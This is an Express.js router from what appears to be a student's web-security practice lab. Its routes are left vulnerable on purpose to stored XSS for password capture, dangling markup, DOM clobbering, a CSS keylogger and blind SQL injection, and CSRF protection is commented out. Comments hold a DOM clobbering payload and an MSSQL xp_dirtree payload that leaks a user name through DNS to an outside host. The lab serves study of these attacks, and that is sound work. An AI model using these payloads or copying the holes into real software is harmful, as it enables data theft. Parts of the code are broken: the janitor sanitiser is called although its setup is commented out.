const express = require('express')
const db = require('../db')
const router = express.Router()
const csrf = require('csurf')

const createDOMPurify = require('dompurify');
const {JSDOM} = require('jsdom');
const window = new JSDOM('').window
const DOMPurify = createDOMPurify(window)

/*
const HTMLJanitor = require('html-janitor\\src\\html-janitor.js')
const config = {tags: {p: {}, a: {href: true}, form: {onfocus: false}, input: {}}}
const janitor = new HTMLJanitor(config)
*/

//const csrfProtection = csrf()
//router.use(csrfProtection)

// /main
router.get('/', async (req, res) => {
    res.render('main.ejs')
})

router.post('/', (req, res) => {
    res.send('POST route on main')
})

var posts = []
var dom_posts = []
var dom_posts2 = []

// /dangling-markup 07t96verkayg
router.get('/dangling-markup', (req, res) => {
    res.render('dangling-markup.ejs', {csrfToken: req.app.locals._token})
})

router.post('/dangling-markup', (req, res) => {
    res.send('POST route on main')
})



router.post('/signup', (req, res) => {
    res.redirect('/')
})




// XSS to capture password
//potreban je pasvord menager

router.get('/xss-to-capture-pass', (req, res) => {
    res.render('xss-to-capture-pass.ejs', {csrfToken: req.app.locals._token})
})

router.post('/xss-to-capture-pass', (req, res) => {
    res.send('POST rute for /xss-to-capture-pass')
})


router.post('/xss-to-capture-pass/login', async (req, res) => {
    try {
        let result = await db.get_user_id(req.body.name, req.body.pass)
        console.log(result)
        if (result.length > 0) {
            req.session.user_num = result[0].user_id
            req.session.user_name = req.body.name
            res.redirect('/xss-to-capture-pass/blog')
        }
        else {
            console.log("Wrong user name or password")
            res.redirect('/xss-to-capture-pass')
        }
    }
    catch(e) {
        console.log(e)
        res.sendStatus(500)
    }
})

router.get('/xss-to-capture-pass/logout', (req, res) => {
    console.log("Logged out")
    delete req.session.user_num
    delete req.session.user_name
    res.redirect('/xss-to-capture-pass')
})

function x2cp_blog_checkLogIn(req, res, next) {
    if(req.session.user_num) {
        next()
    }
    else {
        var err = new Error("Not logged in!")
        console.log(req.session.user_num)
        next(err)
    }
}

router.get('/xss-to-capture-pass/blog', x2cp_blog_checkLogIn, (req, res) => {
    res.render('x2cp-blog.ejs', 
    {csrfToken: req.app.locals._token, 
    user: req.session.user_name, 
    posts: posts})
    console.log(req.app.locals._token)
})

router.post('/xss-to-capture-pass/blog', (req, res) => {
    if(req.body.post) {
        posts.push(req.body.post)
        console.log("Post sent")
        res.redirect('/xss-to-capture-pass/blog')
    }
})



//--------------------------------------------------------------------------
//MSSQL
/*
03tqij9ohphk04x7%27%3B
declare @p varchar(1024)%3B
set @p=(SELECT user_name FROM users WHERE user_id = 2)%3B
exec('master..xp_dirtree %22//'+@p+'.foo.arrdub.net/a%22')%3B--

03tqij9ohphk04x7%27%3BSELECT user_name FROM users WHERE user_id = 1%3B--
';
declare @p varchar(1024);
set @p=(SELECT user_name FROM users WHERE user_id=2);
exec('master..xp_dirtree"//'+@p+'.foo.arrdub.net/a"');--

SELECT user_id FROM blind_users WHERE TrackingID = '03tqij9ohphk04x7';
declare @p varchar(1024);
set @p=(SELECT user_name FROM users WHERE user_id = 2);
exec('master..xp_dirtree "//'+@p+'.foo.arrdub.net/a"');--';

*/

router.get('/blind-sqli', (req, res) => {
    res.render('blind-sqli.ejs')
})

router.post('/blind-sqli', (req, res) => {
    res.send('POST route for /blind-sqli')
})



//DOM clobering
//payload (crome only)
//<a id=doc><a id=doc name=path href="cid:alert(1)//">

router.get('/dom-clobering', (req, res) => {
    res.render('dom-clobering', {csrfToken: req.app.locals._token, 
        posts: dom_posts})
})

router.post('/dom-clobering', (req, res) => {
    if(req.body.post) {
        var clean = DOMPurify.sanitize(req.body.post)
        dom_posts.push(clean)
        console.log(clean)
        res.redirect('/dom-clobering')
    }
})

router.get('posts.js', (req, res) => {
    console.log(req)
    res.sendFile('C:/Users/Luka/Desktop/Faks/Diplomski/practise/asp_test.js')
})

router.get('/dom-clobering2', (req, res) => {
    res.render('dom-clob2', {csrfToken: req.app.locals._token, posts: dom_posts2})
})

router.post('/dom-clobering2', (req, res) => {
    if(req.body.post) {
        console.log(req.body.post)
        var clean = janitor.clean(req.body.post)
        console.log(clean)
        dom_posts2.push(clean)
        res.redirect('/dom-clobering2')
    }
})



//CSS keyloger

router.get('/css-keyloger', (req, res) => {
    res.render('css-keyloger', {csrfToken: req.app.locals._token})
})

router.post('/css-keyloger', (req, res) => {
    res.send('POST route for /css-keyloger')
})

router.get('/css-keyloger2', (req, res) => {
    res.render('css-keyloger2.ejs', {csrfToken: req.app.locals._token})
})

router.get('/keyloger.css', (req, res) => {
    res.sendFile('C:\\Users\\Luka\\Desktop\\Faks\\Diplomski\\practise\\styles\\keyloger.css')
})


module.exports = router